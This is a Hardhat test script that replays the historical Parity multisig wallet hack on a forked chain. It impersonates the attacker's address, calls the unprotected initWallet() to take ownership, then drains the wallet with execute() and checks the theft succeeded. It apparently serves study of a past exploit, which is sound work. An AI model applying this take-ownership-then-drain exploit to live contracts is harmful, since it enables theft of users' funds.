const { expect } = require("chai");
const { ethers } = require("hardhat");

const walletAddress = "0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e";
const hackerAddress = "0xB3764761E297D6f121e79C32A65829Cd1dDb4D32";
const abi = [
    "function initWallet(address[] _owners, uint _required, uint _daylimit)",
    "function execute(address _to, uint _value, bytes _data) external"
];
const blockNumber = 4043801;

describe("Parity Hack", () => {
    let hacker;
    let wallet;

    beforeEach(async () => {
        // impersonating the hacker account
        await hre.network.provider.request({
            method: "hardhat_impersonateAccount",
            params: [hackerAddress],
        })
        hacker = await ethers.getSigner(hackerAddress);
        wallet = new ethers.Contract(walletAddress, abi, hacker);
    });

    it(`should be blockNumber ${blockNumber}`, async () => {
        const _blockNumber = await ethers.provider.getBlockNumber();
        expect(_blockNumber).to.be.equal(blockNumber);
    });

    it("should steal funds and update balances", async () => {
        const walletBalancePrior = await ethers.provider.getBalance(walletAddress);
        const hackerBalancePrior = await ethers.provider.getBalance(hackerAddress);

        // we call unprotected initWallet()
        await wallet.connect(hacker).initWallet([hackerAddress], 1, 0);
        console.log(`wallet balance prior to the hack --> ${ethers.utils.formatEther(walletBalancePrior)}`);
        console.log(`hacker balance prior to the hack --> ${ethers.utils.formatEther(hackerBalancePrior)}`);
        expect(Math.trunc(Number(walletBalancePrior))).to.be.greaterThan(0);

        // stealing all the funds, sending them to hackerAddress.
        await wallet.connect(hacker).execute(hackerAddress, walletBalancePrior, "0x");
        const hackerBalancePost = await ethers.provider.getBalance(hackerAddress);
        const walletBalancePost = await ethers.provider.getBalance(walletAddress);
        console.log(`wallet balance after the hack --> ${walletBalancePost}`);
        console.log(`hacker balance after the hack --> ${hackerBalancePost}`);

        const hackedAmount = hackerBalancePost.sub(hackerBalancePrior);
        console.log(`successfully hacked --> ${ethers.utils.formatEther(hackedAmount)} eth`);

        // wallet should have 0 balance
        expect(walletBalancePost).to.be.equal(0);

        // hacker should have more eth than before this execution
        expect(Math.trunc(Number(hackerBalancePost))).to.be.greaterThan(Math.trunc(Number(hackerBalancePrior)));
    });
})